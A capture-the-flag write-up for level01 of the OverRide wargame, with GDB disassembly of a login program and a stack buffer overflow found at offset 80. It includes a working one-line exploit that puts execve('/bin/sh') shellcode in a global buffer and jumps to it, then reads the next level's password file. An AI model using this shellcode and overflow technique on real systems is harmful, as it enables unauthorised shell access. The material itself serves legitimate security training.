# LEVEL01
**Info: level protect option**
```sh
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
```
---
```sh
level01@OverRide:~$ ls -la
total 17
dr-xr-x---+ 1 level01 level01   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level01 level01  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level01 level01 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level02 users   7360 Sep 10  2016 level01
-rw-r--r--+ 1 level01 level01   41 Oct 19  2016 .pass
-rw-r--r--  1 level01 level01  675 Sep 10  2016 .profile
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: 42
verifying username....

nope, incorrect username...
```
We can find one excutable file **level01**, who take standard input with Username etc...\
\
Check it with GDB, \
\
As we can there is a local variable, let's call it ```buffer```, with the size ```64```.
```sh
   0x080484d8 <+8>:     sub    $0x60,%esp
   0x080484db <+11>:    lea    0x1c(%esp),%ebx #  96 - 28 - 4 = 64
   ...
   0x080484df <+15>:    mov    $0x0,%eax
   0x080484e4 <+20>:    mov    $0x10,%edx
   0x080484e9 <+25>:    mov    %ebx,%edi
   0x080484eb <+27>:    mov    %edx,%ecx # 16 * 4 byte
   0x080484ed <+29>:    rep stos %eax,%es:(%edi) # memeset(buffer, 64, 0);
   ...
   0x08048574 <+164>:   call   0x8048370 <fgets@plt> # fgets(buffer, 100, stdin);
```
It will be used to store our input later for password with ```fgets```, but the size is 100. \
Here we go, buffer overflow.
```sh
(gdb) r
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37636136 in ?? ()

Enter the hex value to find (e.g., 0x63613563): 0x37636136
Little Endian ASCII representation: '6ac7'
'6ac7' found at offset: 80
```
We found the offset where our EIP locates, at ```80```. \
Now we only need the space for the shell code, since there is nowhere in the code where ```/bin/sh``` or similar code for the exploitation is called. \
So we can try to find the place where we can put our shell code. \
There is the global variable ```a_user_name```, with size 100, who takes the string by ```fgets``` only 7 bytes, (main+88) \
so we can use this variable's rest (93 bytes) addresses to save and run our shell code.
```sh
(gdb) disas main
   ...
   0x08048510 <+64>:    mov    0x804a020,%eax #stdin
   0x08048515 <+69>:    mov    %eax,0x8(%esp)
   0x08048519 <+73>:    movl   $0x100,0x4(%esp) # 256
   0x08048521 <+81>:    movl   $0x804a040,(%esp) # global variable a_user_name
   0x08048528 <+88>:    call   0x8048370 <fgets@plt> # fgets(a_user_name, 256, stdin)
   ...
(gdb) x/100s 0x804a040
   0x804a040 <a_user_name>:         ""
   0x804a041 <a_user_name+1>:       ""
   ...
   0x804a0a2 <a_user_name+98>:      ""
   0x804a0a3 <a_user_name+99>:      ""
   0x804a0a4:       <Address 0x804a0a4 out of bounds>
```
We put the first argument that saves our shell code in ```a_user_name```, and the second argument we will put the address of ```a_user_name``` at the location of buffer overflow. ```(a_user_name + 7(dat_wil)) = 0x08040a47```
```sh
level01@OverRide:~$ (python -c 'print "dat_wil\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 80 + "\x47\xa0\x04\x08"'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
(hidden)
```
level01 passed !

assmebly analayse
---

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x080484d0 <+0>:     push   %ebp
   0x080484d1 <+1>:     mov    %esp,%ebp
   0x080484d3 <+3>:     push   %edi
   0x080484d4 <+4>:     push   %ebx
   0x080484d5 <+5>:     and    $0xfffffff0,%esp
   0x080484d8 <+8>:     sub    $0x60,%esp
   0x080484db <+11>:    lea    0x1c(%esp),%ebx #  96 - 28 - 4 = buffer[64]
   0x080484df <+15>:    mov    $0x0,%eax
   0x080484e4 <+20>:    mov    $0x10,%edx
   0x080484e9 <+25>:    mov    %ebx,%edi
   0x080484eb <+27>:    mov    %edx,%ecx # 16 * 4 byte
   0x080484ed <+29>:    rep stos %eax,%es:(%edi) # memeset(buffer, 64, 0)
   0x080484ef <+31>:    movl   $0x0,0x5c(%esp)
   0x080484f7 <+39>:    movl   $0x80486b8,(%esp) #  "********* ADMIN LOGIN PROMPT *********"
   0x080484fe <+46>:    call   0x8048380 <puts@plt>
   0x08048503 <+51>:    mov    $0x80486df,%eax #  "Enter Username: "
   0x08048508 <+56>:    mov    %eax,(%esp)
   0x0804850b <+59>:    call   0x8048360 <printf@plt>
   0x08048510 <+64>:    mov    0x804a020,%eax #stdin
   0x08048515 <+69>:    mov    %eax,0x8(%esp)
   0x08048519 <+73>:    movl   $0x100,0x4(%esp) # 256
   0x08048521 <+81>:    movl   $0x804a040,(%esp) # global variable a_user_name
   0x08048528 <+88>:    call   0x8048370 <fgets@plt> # fgets(a_user_name, 256, stdin)
   0x0804852d <+93>:    call   0x8048464 <verify_user_name>
   0x08048532 <+98>:    mov    %eax,0x5c(%esp)
   0x08048536 <+102>:   cmpl   $0x0,0x5c(%esp)
   0x0804853b <+107>:   je     0x8048550 <main+128>
   0x0804853d <+109>:   movl   $0x80486f0,(%esp)
   0x08048544 <+116>:   call   0x8048380 <puts@plt>
   0x08048549 <+121>:   mov    $0x1,%eax
   0x0804854e <+126>:   jmp    0x80485af <main+223>
   0x08048550 <+128>:   movl   $0x804870d,(%esp)
   0x08048557 <+135>:   call   0x8048380 <puts@plt>
   0x0804855c <+140>:   mov    0x804a020,%eax # stdin
   0x08048561 <+145>:   mov    %eax,0x8(%esp)
   0x08048565 <+149>:   movl   $0x64,0x4(%esp) # 100
   0x0804856d <+157>:   lea    0x1c(%esp),%eax
   0x08048571 <+161>:   mov    %eax,(%esp)
   0x08048574 <+164>:   call   0x8048370 <fgets@plt> # fgets(buffer, 100, stdin);
   0x08048579 <+169>:   lea    0x1c(%esp),%eax # buffer
   0x0804857d <+173>:   mov    %eax,(%esp)
   0x08048580 <+176>:   call   0x80484a3 <verify_user_pass> # verify_user_pass(buffer)
   0x08048585 <+181>:   mov    %eax,0x5c(%esp)
   0x08048589 <+185>:   cmpl   $0x0,0x5c(%esp) # cmp verify_user_pass with 0
   0x0804858e <+190>:   je     0x8048597 <main+199>
   0x08048590 <+192>:   cmpl   $0x0,0x5c(%esp) # cmp verify_user_pass with 0
   0x08048595 <+197>:   je     0x80485aa <main+218>
   0x08048597 <+199>:   movl   $0x804871e,(%esp)
   0x0804859e <+206>:   call   0x8048380 <puts@plt>
   0x080485a3 <+211>:   mov    $0x1,%eax
   0x080485a8 <+216>:   jmp    0x80485af <main+223>
   0x080485aa <+218>:   mov    $0x0,%eax
   0x080485af <+223>:   lea    -0x8(%ebp),%esp
   0x080485b2 <+226>:   pop    %ebx
   0x080485b3 <+227>:   pop    %edi
   0x080485b4 <+228>:   pop    %ebp
   0x080485b5 <+229>:   ret    
End of assembler dump.

(gdb) disas verify_user_name
Dump of assembler code for function verify_user_name:
   0x08048464 <+0>:     push   %ebp
   0x08048465 <+1>:     mov    %esp,%ebp
   0x08048467 <+3>:     push   %edi
   0x08048468 <+4>:     push   %esi
   0x08048469 <+5>:     sub    $0x10,%esp
   0x0804846c <+8>:     movl   $0x8048690,(%esp)
   0x08048473 <+15>:    call   0x8048380 <puts@plt>
   0x08048478 <+20>:    mov    $0x804a040,%edx # global variable a_user_name[100] ""
   0x0804847d <+25>:    mov    $0x80486a8,%eax # "dat_wil"
   0x08048482 <+30>:    mov    $0x7,%ecx
   0x08048487 <+35>:    mov    %edx,%esi
   0x08048489 <+37>:    mov    %eax,%edi
   0x0804848b <+39>:    repz cmpsb %es:(%edi),%ds:(%esi) # strncmp(a_user_name, "dat_wil" ,7)
   0x0804848d <+41>:    seta   %dl
   0x08048490 <+44>:    setb   %al
   0x08048493 <+47>:    mov    %edx,%ecx
   0x08048495 <+49>:    sub    %al,%cl
   0x08048497 <+51>:    mov    %ecx,%eax
   0x08048499 <+53>:    movsbl %al,%eax
   0x0804849c <+56>:    add    $0x10,%esp
   0x0804849f <+59>:    pop    %esi
   0x080484a0 <+60>:    pop    %edi
   0x080484a1 <+61>:    pop    %ebp
   0x080484a2 <+62>:    ret    
End of assembler dump.

(gdb) disas verify_user_pass
Dump of assembler code for function verify_user_pass:
   0x080484a3 <+0>:     push   %ebp
   0x080484a4 <+1>:     mov    %esp,%ebp
   0x080484a6 <+3>:     push   %edi
   0x080484a7 <+4>:     push   %esi
   0x080484a8 <+5>:     mov    0x8(%ebp),%eax # first parameter
   0x080484ab <+8>:     mov    %eax,%edx
   0x080484ad <+10>:    mov    $0x80486b0,%eax # admin
   0x080484b2 <+15>:    mov    $0x5,%ecx # 5
   0x080484b7 <+20>:    mov    %edx,%esi
   0x080484b9 <+22>:    mov    %eax,%edi
   0x080484bb <+24>:    repz cmpsb %es:(%edi),%ds:(%esi) # strncmp(parameter, "admin", 5)
   0x080484bd <+26>:    seta   %dl
   0x080484c0 <+29>:    setb   %al
   0x080484c3 <+32>:    mov    %edx,%ecx
   0x080484c5 <+34>:    sub    %al,%cl
   0x080484c7 <+36>:    mov    %ecx,%eax
   0x080484c9 <+38>:    movsbl %al,%eax
   0x080484cc <+41>:    pop    %esi
   0x080484cd <+42>:    pop    %edi
   0x080484ce <+43>:    pop    %ebp
   0x080484cf <+44>:    ret    
End of assembler dump.
```


